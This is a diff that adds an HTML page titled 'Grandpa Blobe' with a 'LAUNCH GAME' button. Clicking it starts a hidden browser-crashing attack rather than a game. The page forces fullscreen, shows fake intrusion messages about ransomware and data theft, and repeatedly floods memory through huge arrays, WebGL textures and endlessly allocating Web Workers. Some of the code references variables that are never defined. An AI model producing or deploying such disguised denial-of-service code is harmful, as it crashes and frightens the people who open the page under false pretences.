@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grandpa Blobe</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: "Courier New", monospace;
+      margin: 0;
+      overflow: hidden;
+      height: 100vh;
+    }
+
+    #hackMessage {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 80px;
+      color: white;
+      font-family: "Comic Sans MS", cursive, sans-serif;
+      background: black;
+      cursor: pointer;
+      z-index: 1000;
+      user-select: none;
+    }
+
+    .hackerText {
+      position: absolute;
+      top: 0;
+      left: 0;
+      font-size: 14px;
+      white-space: nowrap;
+      overflow: hidden;
+      z-index: 500;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    .hackerText span {
+      display: block;
+      animation: scrollText 10s linear infinite;
+    }
+
+    @keyframes scrollText {
+      0% { top: -100%; }
+      100% { top: 100%; }
+    }
+
+    #progressBarContainer {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80%;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      height: 20px;
+      z-index: 1000;
+    }
+
+    #progressBar {
+      height: 100%;
+      width: 0;
+      background: lime;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="hackMessage" onclick="startHack()">
+    LAUNCH GAME
+  </div>
+
+  <div class="hackerText" id="hackerText"></div>
+
+  <div id="progressBarContainer">
+    <div id="progressBar"></div>
+  </div>
+
+  <script>
+    const status = document.getElementById('hackMessage');
+    const hackerText = document.getElementById('hackerText');
+    const progressBar = document.getElementById('progressBar');
+    let ramChunks = [];
+    let textures = [];
+    let gls = [];
+    let workers = [];
+    let fullScreen = false;
+    let progress = 0;
+
+    function allocRAM() {
+      for (let i = 0; i < 5000; i++) {
+        const arr = new Float64Array(50_000_000);
+        arr.fill(Math.random());
+        ramChunks.push(arr);
+        if (i % 10 === 0) updateHackerText(`Allocating RAM... ${Math.round((ramChunks.length * 400) / 1000)} GB`);
+      }
+    }
+
+    function createTextures() {
+      for (let i = 0; i < 200; i++) {
+        const size = 2048;
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        const pixels = new Uint8Array(size * size * 4);
+        pixels.fill(i % 255);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+        textures.push(tex);
+        if (i % 10 === 0) updateHackerText(`Created textures... ${textures.length} textures`);
+      }
+    }
+
+    function framebufferInsanity() {
+      for (let i = 0; i < 20; i++) {
+        const canvas = document.createElement('canvas');
+        canvas.width = 2048;
+        canvas.height = 2048;
+        document.body.appendChild(canvas);
+        const gl = canvas.getContext('webgl');
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        const fb = gl.createFramebuffer();
+        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gls.push(gl);
+      }
+      updateHackerText("Created framebuffers... Chaos incoming!");
+    }
+
+    function spawnWorkers() {
+      for (let i = 0; i < 8; i++) {
+        const workerScript = new Blob([`
+          let arr = [];
+          while (true) {
+            arr.push(new Float64Array(50_000_000).fill(Math.random()));
+          }
+        `], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerScript));
+        workers.push(worker);
+      }
+      updateHackerText("Workers consuming memory... instant chaos!");
+    }
+
+    function animate() {
+      for (const canvas of canvases) {
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = `hsl(\${Math.random() * 360}, 100%, 50%)`;
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function startHack() {
+      status.style.display = 'none';
+      if (!fullScreen) {
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) {
+          document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+          document.documentElement.msRequestFullscreen();
+        }
+        fullScreen = true;
+      }
+
+      createHackerEffect();
+
+      setTimeout(() => {
+        keepCrashGoing();
+      }, 1000);
+    }
+
+    function createHackerEffect() {
+      const hackerLines = [
+        "ACCESSING MAINFRAME...",
+        "HACKER INTRUSION DETECTED",
+        "INITIATING SYSTEM OVERRIDE",
+        "SECURITY BREACH CONFIRMED",
+        "LOADING MALWARE...",
+        "BYPASSING FIREWALL...",
+        "TRANSMITTING FILES TO REMOTE SERVER...",
+        "DECODING ENCRYPTION ALGORITHM...",
+        "ACCESSING DATABASE...",
+        "MALWARE ACTIVATED...",
+        "DISABLING SYSTEM PROTECTIONS...",
+        "OVERRIDING ADMIN CREDENTIALS...",
+        "DEPLOYING RANSOMWARE...",
+        "EXFILTRATING DATA...",
+        "SYSTEM INFECTION COMPLETE...",
+        "ALL SYSTEMS COMPROMISED...",
+        "HACKER REMOTE ACCESS ESTABLISHED",
+        "COMPLETING MALICIOUS ACTIVITIES...",
+        "ESTABLISHING PERSISTENT BACKDOOR...",
+        "DEPLOYING ADVANCED TROJANS...",
+        "SYSTEM WIPE IN PROGRESS..."
+      ];
+      let lineIndex = 0;
+
+      setInterval(() => {
+        const newLine = document.createElement('span');
+        newLine.textContent = hackerLines[lineIndex];
+        hackerText.appendChild(newLine);
+        lineIndex = (lineIndex + 1) % hackerLines.length;
+      }, 150);
+    }
+
+    function updateHackerText(message) {
+      hackerText.innerHTML = `<span>${message}</span>`;
+    }
+
+    function updateProgressBar() {
+      if (progress < 100) {
+        progress += 0.2;
+        progressBar.style.width = `${progress}%`;
+      }
+    }
+
+    function keepCrashGoing() {
+      setInterval(() => {
+        allocRAM();
+        createTextures();
+        framebufferInsanity();
+        spawnWorkers();
+        requestAnimationFrame(animate);
+        updateProgressBar();
+      }, 10);
+    }
+  </script>
+
+</body>
+</html>
